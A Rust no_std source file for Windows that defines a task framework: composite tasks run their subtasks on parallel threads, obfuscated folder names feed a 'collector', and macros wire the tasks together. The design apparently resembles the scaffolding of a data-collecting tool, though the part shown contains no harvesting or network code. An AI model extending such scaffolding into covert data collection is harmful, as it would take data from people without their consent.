#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::boxed::Box;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use core::ffi::c_void;
use core::ptr::null_mut;
use utils::path::Path;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::Foundation::TRUE;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForMultipleObjects};

#[macro_export]
macro_rules! composite_task {
    ( $( $expr:expr ),* $(,)? ) => {
        CompositeTask::new(vec![
            $(
                alloc::sync::Arc::new($expr)
            ),*
        ])
    };
}

#[macro_export]
macro_rules! parent_name {
    ($name:expr) => {
        fn parent_name(&self) -> Option<alloc::string::String> {
            Some(obfstr::obfstr!($name).to_owned())
        }
    };
}

#[macro_export]
macro_rules! impl_composite_task_runner {
    ($task_type:ty) => {
        impl<C: collector::Collector> Task<C> for $task_type {
            unsafe fn run(&self, parent: &utils::path::Path, collector: &C) {
                unsafe {
                    self.inner.run(parent, collector);
                }
            }
        }
    };

    ($task_type:ty, $parent_name:expr) => {
        impl<C: collector::Collector> Task<C> for $task_type {
            $crate::parent_name!($parent_name);

            unsafe fn run(&self, parent: &utils::path::Path, collector: &C) {
                unsafe {
                    self.inner.run(parent, collector);
                }
            }
        }
    };
}

pub trait Task<C: Collector>: Send + Sync {
    fn parent_name(&self) -> Option<String> {
        None
    }
    
    unsafe fn run(&self, parent: &Path, collector: &C);
}

pub struct CompositeTask<C: Collector> {
    subtasks: Vec<Arc<dyn Task<C>>>
}

impl<C: Collector> CompositeTask<C> {
    pub fn new(subtasks: Vec<Arc<dyn Task<C>>>) -> CompositeTask<C> {
        Self {
            subtasks
        }
    }
}

impl<C: Collector> Task<C> for CompositeTask<C> {
    unsafe fn run(&self, parent: &Path, collector: &C) {
        match self.subtasks.len() {
            0 => (),
            1 => {
                let task = &self.subtasks[0];
                task.run(&task_path(task, parent), collector);
            }
            _ => run_tasks(&self.subtasks, parent, collector)
        }
    }
}

unsafe fn run_tasks<C>(tasks: &[Arc<dyn Task<C>>], parent: &Path, collector: &C)
where
    C: Collector
{
    let mut handles: Vec<HANDLE> = Vec::new();

    for task in tasks {
        let params = Box::new(ThreadParams {
            task: task.clone(),
            path: task_path(task, parent),
            collector
        });

        let handle = unsafe {
            CreateThread(
                null_mut(),
                0,
                Some(thread_proc::<C>),
                Box::into_raw(params) as *mut _,
                0,
                null_mut()
            )
        };

        if !handle.is_null() {
            handles.push(handle);
        }
    }

    WaitForMultipleObjects(
        handles.len() as _,
        handles.as_ptr(),
        TRUE,
        0xFFFFFFFF,
    );

    for handle in handles {
        CloseHandle(handle);
    }
}

fn task_path<C: Collector>(task: &Arc<dyn Task<C>>, parent: &Path) -> Path {
    match task.parent_name() {
        Some(name) => parent / name,
        None => parent.clone(),
    }
}

struct ThreadParams<'a, C: Collector> {
    task: Arc<dyn Task<C>>,
    path: Path,
    collector: &'a C,
}

#[allow(unsafe_op_in_unsafe_fn)]
unsafe extern "system" fn thread_proc<C: Collector>(param: *mut c_void) -> u32 {
    let params = Box::from_raw(param as *mut ThreadParams<C>);

    params.task.run(&params.path, params.collector);

    drop(params);
    
    0
}
